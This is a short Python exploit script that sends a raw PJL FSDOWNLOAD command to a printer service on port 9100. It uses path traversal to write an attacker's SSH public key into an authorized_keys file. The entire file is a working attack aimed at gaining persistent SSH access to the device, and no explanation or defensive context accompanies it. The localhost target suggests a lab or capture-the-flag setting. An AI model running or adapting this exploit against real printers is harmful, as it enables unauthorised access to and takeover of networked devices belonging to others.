import socket

TARGET = "127.0.0.1"
PORT = 9100

pubkey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBTy2XRNPnGNbCMG5C8Gp0jD42Epvm7D8SOzm7LW8Kvn rgmy@debian1"
data = pubkey.encode()

path = "0:\\..\\.ssh\\authorized_keys"
header = f'\x1b%-12345X@PJL FSDOWNLOAD NAME="{path}" SIZE={len(data)}\r\n'.encode()
footer = b'\x1b%-12345X'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.sendall(header + data + footer)
print(s.recv(4096))
s.close()
